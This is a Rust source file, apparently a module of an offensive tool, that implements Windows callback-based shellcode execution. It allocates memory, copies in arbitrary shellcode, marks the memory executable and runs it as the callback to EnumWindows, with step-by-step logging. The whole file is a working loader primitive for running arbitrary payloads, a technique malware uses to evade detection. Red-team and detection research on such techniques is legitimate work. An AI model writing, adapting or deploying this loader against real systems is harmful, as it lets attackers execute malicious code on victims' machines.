use crate::injection::InjectionResult;
use crate::log::LogSink;

#[cfg(windows)]
pub fn live_inject(shellcode: &[u8], log: &LogSink) -> Result<InjectionResult, String> {
    use std::ffi::c_void;
    use windows::Win32::Foundation::BOOL;
    use windows::Win32::System::Memory::{
        VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ,
        PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
    };

    type WNDENUMPROC = unsafe extern "system" fn(isize, isize) -> BOOL;

    #[link(name = "user32")]
    extern "system" {
        fn EnumWindows(lpEnumFunc: WNDENUMPROC, lParam: isize) -> BOOL;
    }

    log.step("[1/4] VirtualAlloc(PAGE_READWRITE) for shellcode".to_string());
    let alloc = unsafe {
        VirtualAlloc(
            None,
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )
    };
    if alloc.is_null() {
        return Err("VirtualAlloc failed".to_string());
    }
    let base = alloc as usize;

    log.step(format!(
        "[2/4] Copy {} bytes to 0x{base:016X}",
        shellcode.len()
    ));
    unsafe {
        std::ptr::copy_nonoverlapping(shellcode.as_ptr(), alloc as *mut u8, shellcode.len());
    }

    log.step("[3/4] VirtualProtect → PAGE_EXECUTE_READ".to_string());
    let mut old_protect = PAGE_PROTECTION_FLAGS(0);
    unsafe {
        VirtualProtect(alloc, shellcode.len(), PAGE_EXECUTE_READ, &mut old_protect)
    }
    .map_err(|e| format!("VirtualProtect failed: {e}"))?;

    log.step("[4/4] EnumWindows(callback) — shellcode executes as callback".to_string());
    let callback: WNDENUMPROC = unsafe { std::mem::transmute(alloc as *const c_void) };
    unsafe {
        let _ = EnumWindows(callback, 0);
    }

    log.info(format!(
        "  ✓ Callback execution complete at 0x{base:016X}"
    ));

    Ok(InjectionResult {
        remote_base: base as u64,
        size: shellcode.len(),
    })
}

#[cfg(not(windows))]
pub fn live_inject(_shellcode: &[u8], _log: &LogSink) -> Result<InjectionResult, String> {
    Err("callback execution is only available on Windows".to_string())
}
